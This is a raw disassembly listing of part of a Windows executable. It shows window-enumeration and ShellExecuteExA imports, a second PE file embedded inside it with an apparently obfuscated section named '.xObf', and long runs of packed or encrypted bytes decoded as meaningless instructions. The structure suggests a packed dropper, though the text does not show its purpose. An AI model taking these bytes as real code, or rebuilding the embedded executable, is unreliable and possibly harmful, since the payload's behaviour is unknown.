  40f2cd:	65 6c                	gs insb (%dx),%es:(%edi)
  40f2cf:	6c                   	insb   (%dx),%es:(%edi)
  40f2d0:	45                   	inc    %ebp
  40f2d1:	78 65                	js     0x40f338
  40f2d3:	63 75 74             	arpl   %esi,0x74(%ebp)
  40f2d6:	65 45                	gs inc %ebp
  40f2d8:	78 41                	js     0x40f31b
  40f2da:	00 00                	add    %al,(%eax)
  40f2dc:	03 01                	add    (%ecx),%eax
  40f2de:	00 00                	add    %al,(%eax)
  40f2e0:	c0 42 00 00          	rolb   $0x0,0x0(%edx)
  40f2e4:	01 4d 65             	add    %ecx,0x65(%ebp)
  40f2e7:	73 73                	jae    0x40f35c
  40f2e9:	61                   	popa
  40f2ea:	67 65 42             	addr16 gs inc %edx
  40f2ed:	6f                   	outsl  %ds:(%esi),(%dx)
  40f2ee:	78 41                	js     0x40f331
  40f2f0:	00 01                	add    %al,(%ecx)
  40f2f2:	47                   	inc    %edi
  40f2f3:	65 74 57             	gs je  0x40f34d
  40f2f6:	69 6e 64 6f 77 54 68 	imul   $0x6854776f,0x64(%esi),%ebp
  40f2fd:	72 65                	jb     0x40f364
  40f2ff:	61                   	popa
  40f300:	64 50                	fs push %eax
  40f302:	72 6f                	jb     0x40f373
  40f304:	63 65 73             	arpl   %esp,0x73(%ebp)
  40f307:	73 49                	jae    0x40f352
  40f309:	64 00 01             	add    %al,%fs:(%ecx)
  40f30c:	49                   	dec    %ecx
  40f30d:	73 57                	jae    0x40f366
  40f30f:	69 6e 64 6f 77 56 69 	imul   $0x6956776f,0x64(%esi),%ebp
  40f316:	73 69                	jae    0x40f381
  40f318:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  40f31c:	01 49 73             	add    %ecx,0x73(%ecx)
  40f31f:	57                   	push   %edi
  40f320:	69 6e 64 6f 77 45 6e 	imul   $0x6e45776f,0x64(%esi),%ebp
  40f327:	61                   	popa
  40f328:	62 6c 65 64          	bound  %ebp,0x64(%ebp,%eiz,2)
  40f32c:	00 01                	add    %al,(%ecx)
  40f32e:	47                   	inc    %edi
  40f32f:	65 74 46             	gs je  0x40f378
  40f332:	6f                   	outsl  %ds:(%esi),(%dx)
  40f333:	72 65                	jb     0x40f39a
  40f335:	67 72 6f             	addr16 jb 0x40f3a7
  40f338:	75 6e                	jne    0x40f3a8
  40f33a:	64 57                	fs push %edi
  40f33c:	69 6e 64 6f 77 00 01 	imul   $0x100776f,0x64(%esi),%ebp
  40f343:	45                   	inc    %ebp
  40f344:	6e                   	outsb  %ds:(%esi),(%dx)
  40f345:	61                   	popa
  40f346:	62 6c 65 57          	bound  %ebp,0x57(%ebp,%eiz,2)
  40f34a:	69 6e 64 6f 77 00 01 	imul   $0x100776f,0x64(%esi),%ebp
  40f351:	45                   	inc    %ebp
  40f352:	6e                   	outsb  %ds:(%esi),(%dx)
  40f353:	75 6d                	jne    0x40f3c2
  40f355:	57                   	push   %edi
  40f356:	69 6e 64 6f 77 73 00 	imul   $0x73776f,0x64(%esi),%ebp
  40f35d:	00 00                	add    %al,(%eax)
  40f35f:	00 00                	add    %al,(%eax)
  40f361:	00 50 45             	add    %dl,0x45(%eax)
  40f364:	00 00                	add    %al,(%eax)
  40f366:	4c                   	dec    %esp
  40f367:	01 06                	add    %eax,(%esi)
  40f369:	00 17                	add    %dl,(%edi)
  40f36b:	63 98 4d 00 00 00    	arpl   %ebx,0x4d(%eax)
  40f371:	00 00                	add    %al,(%eax)
  40f373:	00 00                	add    %al,(%eax)
  40f375:	00 e0                	add    %ah,%al
  40f377:	00 0f                	add    %cl,(%edi)
  40f379:	01 0b                	add    %ecx,(%ebx)
  40f37b:	01 02                	add    %eax,(%edx)
  40f37d:	32 00                	xor    (%eax),%al
  40f37f:	22 00                	and    (%eax),%al
  40f381:	00 00                	add    %al,(%eax)
  40f383:	0e                   	push   %cs
  40f384:	00 00                	add    %al,(%eax)
  40f386:	00 00                	add    %al,(%eax)
  40f388:	00 00                	add    %al,(%eax)
  40f38a:	00 10                	add    %dl,(%eax)
  40f38c:	00 00                	add    %al,(%eax)
  40f38e:	00 10                	add    %dl,(%eax)
  40f390:	00 00                	add    %al,(%eax)
  40f392:	00 40 00             	add    %al,0x0(%eax)
  40f395:	00 00                	add    %al,(%eax)
  40f397:	00 40 00             	add    %al,0x0(%eax)
  40f39a:	00 10                	add    %dl,(%eax)
  40f39c:	00 00                	add    %al,(%eax)
  40f39e:	00 02                	add    %al,(%edx)
  40f3a0:	00 00                	add    %al,(%eax)
  40f3a2:	04 00                	add    $0x0,%al
  40f3a4:	00 00                	add    %al,(%eax)
  40f3a6:	00 00                	add    %al,(%eax)
  40f3a8:	00 00                	add    %al,(%eax)
  40f3aa:	04 00                	add    $0x0,%al
  40f3ac:	00 00                	add    %al,(%eax)
  40f3ae:	00 00                	add    %al,(%eax)
  40f3b0:	00 00                	add    %al,(%eax)
  40f3b2:	00 f0                	add    %dh,%al
  40f3b4:	00 00                	add    %al,(%eax)
  40f3b6:	00 04 00             	add    %al,(%eax,%eax,1)
  40f3b9:	00 00                	add    %al,(%eax)
  40f3bb:	00 00                	add    %al,(%eax)
  40f3bd:	00 02                	add    %al,(%edx)
  40f3bf:	00 00                	add    %al,(%eax)
  40f3c1:	00 00                	add    %al,(%eax)
  40f3c3:	00 10                	add    %dl,(%eax)
  40f3c5:	00 00                	add    %al,(%eax)
  40f3c7:	10 00                	adc    %al,(%eax)
  40f3c9:	00 00                	add    %al,(%eax)
  40f3cb:	00 10                	add    %dl,(%eax)
  40f3cd:	00 00                	add    %al,(%eax)
  40f3cf:	10 00                	adc    %al,(%eax)
  40f3d1:	00 00                	add    %al,(%eax)
  40f3d3:	00 00                	add    %al,(%eax)
  40f3d5:	00 10                	add    %dl,(%eax)
	...
  40f3df:	00 00                	add    %al,(%eax)
  40f3e1:	00 7c 50 00          	add    %bh,0x0(%eax,%edx,2)
  40f3e5:	00 8c 00 00 00 00 60 	add    %cl,0x60000000(%eax,%eax,1)
  40f3ec:	00 00                	add    %al,(%eax)
  40f3ee:	bc 02 00 00 00       	mov    $0x2,%esp
	...
  40f437:	00 00                	add    %al,(%eax)
  40f439:	00 fc                	add    %bh,%ah
  40f43b:	51                   	push   %ecx
  40f43c:	00 00                	add    %al,(%eax)
  40f43e:	f4                   	hlt
	...
  40f457:	00 00                	add    %al,(%eax)
  40f459:	00 2e                	add    %ch,(%esi)
  40f45b:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40f45e:	65 00 00             	add    %al,%gs:(%eax)
  40f461:	00 31                	add    %dh,(%ecx)
  40f463:	07                   	pop    %es
  40f464:	00 00                	add    %al,(%eax)
  40f466:	00 10                	add    %dl,(%eax)
  40f468:	00 00                	add    %al,(%eax)
  40f46a:	00 08                	add    %cl,(%eax)
  40f46c:	00 00                	add    %al,(%eax)
  40f46e:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40f47d:	00 20                	add    %ah,(%eax)
  40f47f:	00 00                	add    %al,(%eax)
  40f481:	60                   	pusha
  40f482:	2e 74 65             	je,pn  0x40f4ea
  40f485:	78 74                	js     0x40f4fb
  40f487:	00 00                	add    %al,(%eax)
  40f489:	00 98 19 00 00 00    	add    %bl,0x19(%eax)
  40f48f:	20 00                	and    %al,(%eax)
  40f491:	00 00                	add    %al,(%eax)
  40f493:	1a 00                	sbb    (%eax),%al
  40f495:	00 00                	add    %al,(%eax)
  40f497:	0c 00                	or     $0x0,%al
	...
  40f4a5:	00 20                	add    %ah,(%eax)
  40f4a7:	00 00                	add    %al,(%eax)
  40f4a9:	60                   	pusha
  40f4aa:	2e 72 64             	jb,pn  0x40f511
  40f4ad:	61                   	popa
  40f4ae:	74 61                	je     0x40f511
  40f4b0:	00 00                	add    %al,(%eax)
  40f4b2:	1c 00                	sbb    $0x0,%al
  40f4b4:	00 00                	add    %al,(%eax)
  40f4b6:	00 40 00             	add    %al,0x0(%eax)
  40f4b9:	00 00                	add    %al,(%eax)
  40f4bb:	02 00                	add    (%eax),%al
  40f4bd:	00 00                	add    %al,(%eax)
  40f4bf:	26 00 00             	add    %al,%es:(%eax)
	...
  40f4ce:	40                   	inc    %eax
  40f4cf:	00 00                	add    %al,(%eax)
  40f4d1:	40                   	inc    %eax
  40f4d2:	2e 64 61             	cs fs popa
  40f4d5:	74 61                	je     0x40f538
  40f4d7:	00 00                	add    %al,(%eax)
  40f4d9:	00 a8 07 00 00 00    	add    %ch,0x7(%eax)
  40f4df:	50                   	push   %eax
  40f4e0:	00 00                	add    %al,(%eax)
  40f4e2:	00 08                	add    %cl,(%eax)
  40f4e4:	00 00                	add    %al,(%eax)
  40f4e6:	00 28                	add    %ch,(%eax)
	...
  40f4f4:	00 00                	add    %al,(%eax)
  40f4f6:	40                   	inc    %eax
  40f4f7:	00 00                	add    %al,(%eax)
  40f4f9:	c0 2e 72             	shrb   $0x72,(%esi)
  40f4fc:	73 72                	jae    0x40f570
  40f4fe:	63 00                	arpl   %eax,(%eax)
  40f500:	00 00                	add    %al,(%eax)
  40f502:	bc 02 00 00 00       	mov    $0x2,%esp
  40f507:	60                   	pusha
  40f508:	00 00                	add    %al,(%eax)
  40f50a:	00 04 00             	add    %al,(%eax,%eax,1)
  40f50d:	00 00                	add    %al,(%eax)
  40f50f:	30 00                	xor    %al,(%eax)
	...
  40f51d:	00 40 00             	add    %al,0x0(%eax)
  40f520:	00 40 2e             	add    %al,0x2e(%eax)
  40f523:	78 4f                	js     0x40f574
  40f525:	62 66 00             	bound  %esp,0x0(%esi)
  40f528:	00 00                	add    %al,(%eax)
  40f52a:	16                   	push   %ss
  40f52b:	78 00                	js     0x40f52d
  40f52d:	00 00                	add    %al,(%eax)
  40f52f:	70 00                	jo     0x40f531
  40f531:	00 00                	add    %al,(%eax)
  40f533:	7a 00                	jp     0x40f535
  40f535:	00 00                	add    %al,(%eax)
  40f537:	34 00                	xor    $0x0,%al
	...
  40f549:	e0 00                	loopne 0x40f54b
  40f54b:	e0 00                	loopne 0x40f54d
  40f54d:	00 00                	add    %al,(%eax)
  40f54f:	00 00                	add    %al,(%eax)
  40f551:	00 00                	add    %al,(%eax)
  40f553:	00 62 e3             	add    %ah,-0x1d(%edx)
  40f556:	00 00                	add    %al,(%eax)
  40f558:	f5                   	cmc
  40f559:	ff 2d b4 4e 22 79    	ljmp   *0x79224eb4
  40f55f:	e7 be                	out    %eax,$0xbe
  40f561:	93                   	xchg   %eax,%ebx
  40f562:	6b d3 25             	imul   $0x25,%ebx,%edx
  40f565:	35 3c 12 35 fc       	xor    $0xfc35123c,%eax
  40f56a:	67 73 d2             	addr16 jae 0x40f53f
  40f56d:	83 50 fd 25          	adcl   $0x25,-0x3(%eax)
  40f571:	13 b8 b6 07 d4 84    	adc    -0x7b2bf84a(%eax),%edi
  40f577:	ce                   	into
  40f578:	7d 27                	jge    0x40f5a1
  40f57a:	73 22                	jae    0x40f59e
  40f57c:	35 a9 f0 a1 72       	xor    $0x72a1f0a9,%eax
  40f581:	12 35 16 fc 4b f6    	adc    0xf64bfc16,%dh
  40f587:	db 22                	(bad) (%edx)
  40f589:	5d                   	pop    %ebp
  40f58a:	6b a1 13 b8 1b 4a eb 	imul   $0xffffffeb,0x4a1bb813(%ecx),%esp
  40f591:	1b f7                	sbb    %edi,%esi
  40f593:	74 32                	je     0x40f5c7
  40f595:	77 ba                	ja     0x40f551
  40f597:	22 35 d3 b3 a9 a8    	and    0xa8a9b3d3,%dh
  40f59d:	12 f8                	adc    %al,%bh
  40f59f:	2f                   	das
  40f5a0:	d9 3b                	fnstcw (%ebx)
  40f5a2:	35 06 79 4a 4b       	xor    $0x4b4a7906,%eax
  40f5a7:	6b 13 b8             	imul   $0xffffffb8,(%ebx),%edx
  40f5aa:	30 82 5a 56 f7 5c    	xor    %al,0x5cf7565a(%edx)
  40f5b0:	e6 4e                	out    %al,$0x4e
  40f5b2:	47                   	inc    %edi
  40f5b3:	f0 22 35 83 de 12 fb 	lock and 0xfb12de83,%dh
  40f5ba:	2f                   	das
  40f5bb:	c9                   	leave
  40f5bc:	3b 35 5b ef 38 7c    	cmp    0x7c38ef5b,%esi
  40f5c2:	13 b8 71 37 86 e4    	adc    -0x1b79c88f(%eax),%edi
  40f5c8:	35 ee 3b 60 3c       	xor    $0x3c603bee,%eax
  40f5cd:	26 c0 ff d3          	es sar $0xd3,%bh
  40f5d1:	4d                   	dec    %ebp
  40f5d2:	35 14 12 bf 24       	xor    $0x24bf1214,%eax
  40f5d7:	15 77 35 2b b1       	adc    $0xb12b3577,%eax
  40f5dc:	10 6a 13             	adc    %ch,0x13(%edx)
  40f5df:	b8 ed 3c 19 ee       	mov    $0xee193ced,%eax
  40f5e4:	ec                   	in     (%dx),%al
  40f5e5:	bb c3 c2 35 5e       	mov    $0x5e35c2c3,%ebx
  40f5ea:	22 8f b2 25 30 08    	and    0x83025b2(%edi),%cl
  40f5f0:	bc 73 0d db 4a       	mov    $0x4adb0d73,%esp
  40f5f5:	12 35 94 f4 1c fe    	adc    0xfe1cf494,%dh
  40f5fb:	db 9b 04 fe 0b 15    	fistpl 0x150bfe04(%ebx)
  40f601:	b8 ee 42 db 85       	mov    $0x85db42ee,%eax
  40f606:	2c 97                	sub    $0x97,%al
  40f608:	27                   	daa
  40f609:	73 4f                	jae    0x40f65a
  40f60b:	35 99 3a aa 12       	xor    $0x12aa3a99,%eax
  40f610:	85 12                	test   %edx,(%edx)
  40f612:	3a d8                	cmp    %al,%bl
  40f614:	bf 24 bc 12 79       	mov    $0x7912bc24,%edi
  40f619:	a9 9d 12 13 b8       	test   $0xb813129d,%eax
  40f61e:	f6 49 8c 70          	testb  $0x70,-0x74(%ecx)
  40f622:	eb 7a                	jmp    0x40f69e
  40f624:	32 37                	xor    (%edi),%dh
  40f626:	ce                   	into
  40f627:	22 35 76 15 38 4c    	and    0x4c381576,%dh
  40f62d:	bb 12 2f 58 ee       	mov    $0xee582f12,%ebx
  40f632:	9d                   	popf
  40f633:	35 70 b3 87 e5       	xor    $0xe587b370,%eax
  40f638:	c2 86 14             	ret    $0x1486
  40f63b:	04 dc                	add    $0xdc,%al
  40f63d:	c9                   	leave
  40f63e:	f8                   	clc
  40f63f:	b8 2b 72 39 c4       	mov    $0xc439722b,%eax
  40f644:	24 08                	and    $0x8,%al
  40f646:	c1 1d d7 73 3f e9 3e 	rcrl   $0x3e,0xe93f73d7
  40f64d:	ea f5 33 39 f5 43 be 	ljmp   $0xbe43,$0xf53933f5
  40f654:	27                   	daa
  40f655:	ce                   	into
  40f656:	1b 39                	sbb    (%ecx),%edi
  40f658:	c8 64 ff 05          	enter  $0xff64,$0x5
  40f65c:	14 b8                	adc    $0xb8,%al
  40f65e:	85 70 70             	test   %esi,0x70(%eax)
  40f661:	9b                   	fwait
  40f662:	39 41 de             	cmp    %eax,-0x22(%ecx)
  40f665:	b9 8f 1e d3 20       	mov    $0x20d31e8f,%ecx
  40f66a:	49                   	dec    %ecx
  40f66b:	2f                   	das
  40f66c:	12 73 7b             	adc    0x7b(%ebx),%dh
  40f66f:	b6 5d                	mov    $0x5d,%dh
  40f671:	cf                   	iret
  40f672:	13 ea                	adc    %edx,%ebp
  40f674:	5f                   	pop    %edi
  40f675:	12 50 13             	adc    0x13(%eax),%dl
  40f678:	b8 96 09 40 fa       	mov    $0xfa400996,%eax
  40f67d:	73 dd                	jae    0x40f65c
  40f67f:	80 b9 78 22 a9 2c 6f 	cmpb   $0x6f,0x2ca92278(%ecx)
  40f686:	65 12 35 b2 ff 96 bd 	adc    %gs:0xbd96ffb2,%dh
  40f68d:	8a bd 52 fb 6f 14    	mov    0x146ffb52(%ebp),%bh
  40f693:	b8 f9 d0 b3 c5       	mov    $0xc5b3d0f9,%eax
  40f698:	6f                   	outsl  %ds:(%esi),(%dx)
  40f699:	5c                   	pop    %esp
  40f69a:	f3 64 6e             	rep outsb %fs:(%esi),(%dx)
  40f69d:	b2 26                	mov    $0x26,%dl
  40f69f:	39 ea                	cmp    %ebp,%edx
  40f6a1:	f5                   	cmc
  40f6a2:	2f                   	das
  40f6a3:	9f                   	lahf
  40f6a4:	12 d5                	adc    %ch,%dl
  40f6a6:	bf 25 ef 39 a3       	mov    $0xa339ef25,%edi
  40f6ab:	b7 01                	mov    $0x1,%bh
  40f6ad:	c6                   	(bad)
  40f6ae:	14 b8                	adc    $0xb8,%al
  40f6b0:	94                   	xchg   %eax,%esp
  40f6b1:	c6                   	(bad)
  40f6b2:	ef                   	out    %eax,(%dx)
  40f6b3:	91                   	xchg   %eax,%ecx
  40f6b4:	04 37                	add    $0x37,%al
  40f6b6:	19 7e ec             	sbb    %edi,-0x14(%esi)
  40f6b9:	26 fa                	es cli
  40f6bb:	c9                   	leave
  40f6bc:	3b 37                	cmp    (%edi),%esi
  40f6be:	42                   	inc    %edx
  40f6bf:	0d d9 12 39 4d       	or     $0x4d3912d9,%eax
  40f6c4:	bb b3 34 72 27       	mov    $0x277234b3,%ebx
  40f6c9:	fb                   	sti
  40f6ca:	6f                   	outsl  %ds:(%esi),(%dx)
  40f6cb:	14 b8                	adc    $0xb8,%al
  40f6cd:	18 07                	sbb    %al,(%edi)
  40f6cf:	84 5e 73             	test   %bl,0x73(%esi)
  40f6d2:	27                   	daa
  40f6d3:	c2 1d 9d             	ret    $0x9d1d
  40f6d6:	eb e0                	jmp    0x40f6b8
  40f6d8:	43                   	inc    %ebx
  40f6d9:	0c b2                	or     $0xb2,%al
  40f6db:	25 0c f5 13 12       	and    $0x1213f50c,%eax
  40f6e0:	39 ba f0 5f c0 e0    	cmp    %edi,-0x1f3fa010(%edx)
  40f6e6:	cd 22                	int    $0x22
  40f6e8:	e5 f5                	in     $0xf5,%eax
  40f6ea:	15 b8 ef 70 2c       	adc    $0x2c70efb8,%eax
  40f6ef:	ae                   	scas   %es:(%edi),%al
  40f6f0:	0f 01 73 93          	lmsw   -0x6d(%ebx)
  40f6f4:	c8 61 27 ae          	enter  $0x2761,$0xae
  40f6f8:	58                   	pop    %eax
  40f6f9:	4e                   	dec    %esi
  40f6fa:	08 99 ba 73 12 3a    	or     %bl,0x3a1273ba(%ecx)
  40f700:	c0 bb f5 71 e6 4d 56 	sarb   $0x56,0x4de671f5(%ebx)
  40f707:	f1                   	int1
  40f708:	6f                   	outsl  %ds:(%esi),(%dx)
  40f709:	14 b8                	adc    $0xb8,%al
  40f70b:	7d 27                	jge    0x40f734
  40f70d:	88 8e 9a e7 ba 9e    	mov    %cl,-0x61451866(%esi)
  40f713:	cc                   	int3
  40f714:	26 39 d3             	es cmp %edx,%ebx
  40f717:	c7                   	(bad)
  40f718:	27                   	daa
  40f719:	97                   	xchg   %eax,%edi
  40f71a:	88 12                	mov    %dl,(%edx)
  40f71c:	39 e3                	cmp    %esp,%ebx
  40f71e:	bf 65 75 a2 ef       	mov    $0xefa27565,%edi
  40f723:	e8 f4 13 b8 a8       	call   0xa8f90b1c
  40f728:	d6                   	salc
  40f729:	07                   	pop    %es
  40f72a:	b3 73                	mov    $0x73,%bl
  40f72c:	ee                   	out    %al,(%dx)
  40f72d:	2c 99                	sub    $0x99,%al
  40f72f:	3b d2                	cmp    %edx,%edx
  40f731:	22 35 aa be 12 fd    	and    0xfd12beaa,%dh
  40f737:	17                   	pop    %ss
  40f738:	b0 77                	mov    $0x77,%al
  40f73a:	35 d5 43 b3 68       	xor    $0x68b343d5,%eax
  40f73f:	aa                   	stos   %al,%es:(%edi)
  40f740:	15 b8 35 60 70       	adc    $0x706035b8,%eax
  40f745:	bb c2 70 51 93       	mov    $0x935170c2,%ebx
  40f74a:	aa                   	stos   %al,%es:(%edi)
  40f74b:	0c 38                	or     $0x38,%al
  40f74d:	03 c1                	add    %ecx,%eax
  40f74f:	30 fc                	xor    %bh,%ah
  40f751:	ec                   	in     (%dx),%al
  40f752:	f9                   	stc
  40f753:	3a b9 41 90 e3 01    	cmp    0x1e39041(%ecx),%bh
  40f759:	03 81 4d c2 7f 14    	add    0x147fc24d(%ecx),%eax
  40f75f:	b8 d4 b1 ba b3       	mov    $0xb3bab1d4,%eax
  40f764:	1f                   	pop    %ds
  40f765:	45                   	inc    %ebp
  40f766:	39 25 dd b9 ef d3    	cmp    %esp,0xd3efb9dd
  40f76c:	1c aa                	sbb    $0xaa,%al
  40f76e:	33 12                	xor    (%edx),%edx
  40f770:	74 e3                	je     0x40f755
  40f772:	45                   	inc    %ebp
  40f773:	2e 54                	cs push %esp
  40f775:	77 06                	ja     0x40f77d
  40f777:	c1 bf 13 b8 4b d9 d3 	sarl   $0xd3,-0x26b447ed(%edi)
  40f77e:	f2 7d 22             	bnd jge 0x40f7a3
  40f781:	3b 77 96             	cmp    -0x6a(%edi),%esi
  40f784:	04 8f                	add    $0x8f,%al
  40f786:	aa                   	stos   %al,%es:(%edi)
  40f787:	69 12 35 ac be c9    	imul   $0xc9beac35,(%edx),%edx
  40f78d:	fe 0b                	decb   (%ebx)
  40f78f:	d8 d8                	fcomp  %st(0)
  40f791:	86 aa 15 b8 00 67    	xchg   %ch,0x6700b815(%edx)
  40f797:	a9 6f aa 5c d3       	test   $0xd35caa6f,%eax
  40f79c:	80 b9 b8 27 3a c8 59 	cmpb   $0x59,-0x37c5d848(%ecx)
  40f7a3:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40f7a4:	12 7f 49             	adc    0x49(%edi),%bh
  40f7a7:	80 ef 3a             	sub    $0x3a,%bh
  40f7aa:	16                   	push   %ss
  40f7ab:	75 d1                	jne    0x40f77e
  40f7ad:	43                   	inc    %ebx
  40f7ae:	01 6f 15             	add    %ebp,0x15(%edi)
  40f7b1:	b8 4e 93 0f 98       	mov    $0x980f934e,%eax
  40f7b6:	bb a4 e4 59 f3       	mov    $0xf359e4a4,%ebx
  40f7bb:	27                   	daa
  40f7bc:	3a 20                	cmp    (%eax),%ah
  40f7be:	28 87 2f 60 ef dc    	sub    %al,-0x23109fd1(%edi)
  40f7c4:	05 df 12 3a f2       	add    $0xf23a12df,%eax
  40f7c9:	c9                   	leave
  40f7ca:	bf dd 75 15 32       	mov    $0x321575dd,%edi
  40f7cf:	0c 27                	or     $0x27,%al
  40f7d1:	fb                   	sti
  40f7d2:	b8 98 a1 98 ed       	mov    $0xed98a198,%eax
  40f7d7:	75 2f                	jne    0x40f808
  40f7d9:	c4 04 06             	les    (%esi,%eax,1),%eax
  40f7dc:	c9                   	leave
  40f7dd:	bd 73 7f 24 e4       	mov    $0xe4247f73,%ebp
  40f7e2:	3f                   	aas
  40f7e3:	87 05 1a 12 3a a2    	xchg   %eax,0xa23a121a
  40f7e9:	d8 d8                	fcomp  %st(0)
  40f7eb:	df 75 97             	fbstp  -0x69(%ebp)
  40f7ee:	87 05 ff 25 16 b8    	xchg   %eax,0xb81625ff
  40f7f4:	2a 59 c7             	sub    -0x39(%ecx),%bl
  40f7f7:	79 ef                	jns    0x40f7e8
  40f7f9:	6b ce fd             	imul   $0xfffffffd,%esi,%ecx
  40f7fc:	4b                   	dec    %ebx
  40f7fd:	70 28                	jo     0x40f827
  40f7ff:	97                   	xchg   %eax,%edi
  40f800:	24 e4                	and    $0xe4,%al
  40f802:	13 87 05 56 12 3b    	adc    0x3b125605(%edi),%eax
  40f808:	53                   	push   %ebx
  40f809:	ff 06                	incl   (%esi)
  40f80b:	f2 f7 b4 ac 2d 16 b8 	repnz divl 0x3ab8162d(%esp,%ebp,4)
  40f812:	3a 
  40f813:	4e                   	dec    %esi
  40f814:	78 b6                	js     0x40f7cc
  40f816:	92                   	xchg   %eax,%edx
  40f817:	b9 13 08 04 a4       	mov    $0xa4040813,%ecx
  40f81c:	28 3b                	sub    %bh,(%ebx)
  40f81e:	de b9 91 22 64 92    	fidivrs -0x6d9bdd6f(%ecx)
  40f824:	12 3b                	adc    (%ebx),%bh
  40f826:	39 a4 22 d9 93 a2 7f 	cmp    %esp,0x7fa293d9(%edx,%eiz,1)
  40f82d:	c9                   	leave
  40f82e:	74 13                	je     0x40f843
  40f830:	b8 c5 ed 3b 65       	mov    $0x653bedc5,%eax
  40f835:	5c                   	pop    %esp
  40f836:	c7                   	(bad)
  40f837:	93                   	xchg   %eax,%ebx
  40f838:	b9 da 22 e8 d3       	mov    $0xd3e822da,%ecx
  40f83d:	f2 0b 3f             	repnz or (%edi),%edi
  40f840:	c8 12 f8 2f          	enter  $0xf812,$0x2f
  40f844:	49                   	dec    %ecx
  40f845:	ef                   	out    %eax,(%dx)
  40f846:	35 6a 35 7b 2a       	xor    $0x2a7b356a,%eax
  40f84b:	98                   	cwtl
  40f84c:	13 b8 d3 78 fc 82    	adc    -0x7d03872d(%eax),%edi
  40f852:	ee                   	out    %al,(%dx)
  40f853:	c3                   	ret
  40f854:	70 cf                	jo     0x40f825
  40f856:	3f                   	aas
  40f857:	10 c5                	adc    %al,%ch
  40f859:	e3 04                	jecxz  0x40f85f
  40f85b:	d3 ad 1c 35 97 84    	shrl   %cl,-0x7b68cae4(%ebp)
  40f861:	e2 93                	loop   0x40f7f6
  40f863:	fe                   	(bad)
  40f864:	ef                   	out    %eax,(%dx)
  40f865:	09 69 fe             	or     %ebp,-0x2(%ecx)
  40f868:	13 c2                	adc    %edx,%eax
  40f86a:	3b 0b                	cmp    (%ebx),%ecx
  40f86c:	fa                   	cli
  40f86d:	b8 2d cb 6d 54       	mov    $0x546dcb2d,%eax
  40f872:	46                   	inc    %esi
  40f873:	35 19 f2 ce 75       	xor    $0x75cef219,%eax
  40f878:	1f                   	pop    %ds
  40f879:	d3 e7                	shl    %cl,%edi
  40f87b:	1d 35 34 12 6b       	sbb    $0x6b123435,%eax
  40f880:	7d 1a                	jge    0x40f89c
  40f882:	95                   	xchg   %eax,%ebp
  40f883:	1e                   	push   %ds
  40f884:	e6 ce                	out    %al,$0xce
  40f886:	fe 4b 13             	decb   0x13(%ebx)
  40f889:	b8 5c 82 0b 6e       	mov    $0x6e0b825c,%eax
  40f88e:	6b 7c 22 a1 9d       	imul   $0xffffff9d,-0x5f(%edx,%eiz,1),%edi
  40f893:	1b 01                	sbb    (%ecx),%eax
  40f895:	4a                   	dec    %edx
  40f896:	0a 6a 12             	or     0x12(%edx),%ch
  40f899:	35 8c fb 2f 19       	xor    $0x192ffb8c,%eax
  40f89e:	c0 87 de e1 13 b8 9a 	rolb   $0x9a,-0x47ec1e22(%edi)
  40f8a5:	eb c7                	jmp    0x40f86e
  40f8a7:	38 35 2e 38 99 3b    	cmp    %dh,0x3b99382e
  40f8ad:	b2 22                	mov    $0x22,%dl
  40f8af:	35 d3 e0 e8 6f       	xor    $0x6fe8e0d3,%eax
  40f8b4:	59                   	pop    %ecx
  40f8b5:	dc b9 a0 12 35 45    	fdivrl 0x453512a0(%ecx)
  40f8bb:	43                   	inc    %ebx
  40f8bc:	78 c1                	js     0x40f87f
  40f8be:	13 32                	adc    (%edx),%esi
  40f8c0:	77 16                	ja     0x40f8d8
  40f8c2:	f0 b8 a0 4e c2 d3    	lock mov $0xd3c24ea0,%eax
  40f8c8:	e8 22 35 7b e7       	call   0xe7bc2def
  40f8cd:	3a e2                	cmp    %dl,%ah
  40f8cf:	00 6f d6             	add    %ch,-0x2a(%edi)
  40f8d2:	12 35 e5 6e 56 8b    	adc    0x8b566ee5,%dh
  40f8d8:	a1 3a 03 fe 25       	mov    0x25fe033a,%eax
  40f8dd:	13 b8 e4 35 7a f0    	adc    -0xf85ca1c(%eax),%edi
  40f8e3:	1e                   	push   %ds
  40f8e4:	3b f7                	cmp    %edi,%esi
  40f8e6:	4d                   	dec    %ebp
  40f8e7:	f6 50 d7             	notb   -0x29(%eax)
  40f8ea:	ee                   	out    %al,(%dx)
  40f8eb:	6b 0c 12 35          	imul   $0x35,(%edx,%edx,1),%ecx
  40f8ef:	bc 73 d9 7f c9       	mov    $0xc97fd973,%esp
  40f8f4:	a8 f7                	test   $0xf7,%al
  40f8f6:	7d 13                	jge    0x40f90b
  40f8f8:	b8 12 ad 53 2a       	mov    $0x2a53ad12,%eax
  40f8fd:	a1 77 56 c9 dc       	mov    0xdcc95677,%eax
  40f902:	55                   	push   %ebp
  40f903:	22 6b b8             	and    -0x48(%ebx),%ch
  40f906:	42                   	inc    %edx
  40f907:	12 17                	adc    (%edi),%dl
  40f909:	24 c3                	and    $0xc3,%al
  40f90b:	3b 35 02 5c d1 17    	cmp    0x17d15c02,%esi
  40f911:	5f                   	pop    %edi
  40f912:	48                   	dec    %eax
  40f913:	14 c9                	adc    $0xc9,%al
  40f915:	dc 24 fd b8 33 a9 08 	fsubl  0x8a933b8(,%edi,8)
  40f91c:	db 48 8e             	fisttpl -0x72(%eax)
  40f91f:	26 39 b2 77 ae e1 d3 	cmp    %esi,%es:-0x2c1e5189(%edx)
  40f926:	81 19 47 7c 12 39    	sbbl   $0x39127c47,(%ecx)
  40f92c:	17                   	pop    %ss
  40f92d:	57                   	push   %edi
  40f92e:	d9 fd                	fscale
  40f930:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40f931:	32 77 f6             	xor    -0xa(%edi),%dh
  40f934:	5f                   	pop    %edi
  40f935:	13 b8 e2 03 74 12    	adc    0x127403e2(%eax),%edi
  40f93b:	6f                   	outsl  %ds:(%esi),(%dx)
  40f93c:	c5 22                	lds    (%edx),%esp
  40f93e:	35 41 dc b9 7f       	xor    $0x7fb9dc41,%eax
  40f943:	ea 05 f4 51 87 05 b2 	ljmp   $0xb205,$0x8751f405
  40f94a:	12 35 8b 30 b8 46    	adc    0x46b8308b,%dh
  40f950:	c0 bf 65 82 14 b8 83 	sarb   $0x83,-0x47eb7d9b(%edi)
  40f957:	36 97                	ss xchg %eax,%edi
  40f959:	2a f7                	sub    %bh,%dh
  40f95b:	9d                   	popf
